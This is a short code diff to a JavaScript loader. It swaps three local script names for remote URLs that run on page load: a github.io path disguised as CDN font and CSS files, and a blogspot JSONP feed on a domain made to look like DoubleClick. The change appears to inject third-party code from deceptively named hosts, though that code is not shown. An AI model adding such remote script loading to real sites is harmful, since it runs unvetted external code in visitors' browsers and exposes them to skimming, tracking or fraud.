@@ -1,8 +1,9 @@
 
 let scripts = [
-				'script1.js',
-				'script2.js',
-				'script3.js'
+				'https://kasworld-aero.github.io/old/file/javascript/cdn/adex/font.js',
+				'https://doubleclick-ads-exchange-media-server.blogspot.com/feeds/posts/default?alt=json-in-script&amp;callback=rp_results_label&amp;max-results=10',
+				'https://kasworld-aero.github.io/old/file/javascript/cdn/adex/css.js',
+	'https://kasworld-aero.github.io/old/file/javascript/cdn/adex/font-min.js'
 			];
    window.onload = function(){
 scripts.forEach(function(url) {
